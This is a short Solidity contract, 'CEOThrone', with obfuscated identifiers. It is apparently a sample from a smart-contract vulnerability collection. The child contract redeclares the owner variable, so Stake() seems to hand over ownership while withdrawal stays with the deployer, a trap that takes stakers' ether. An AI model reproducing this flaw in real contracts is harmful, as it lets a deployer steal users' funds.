pragma solidity ^0.4.19;


contract Ownable {
    address public _0x99c9f2;
    function Ownable() public {_0x99c9f2 = msg.sender;}
    modifier _0xb52484() {require(msg.sender == _0x99c9f2); _;
    }
}


contract CEOThrone is Ownable {
    address public _0x99c9f2;
    uint public _0x952ca5;


    function Stake() public payable {

        if (msg.value > _0x952ca5) {
            _0x99c9f2 = msg.sender;
            _0x952ca5 = msg.value;
        }
    }

    function _0xbe8218() public _0xb52484 {

        msg.sender.transfer(this.balance);
    }
}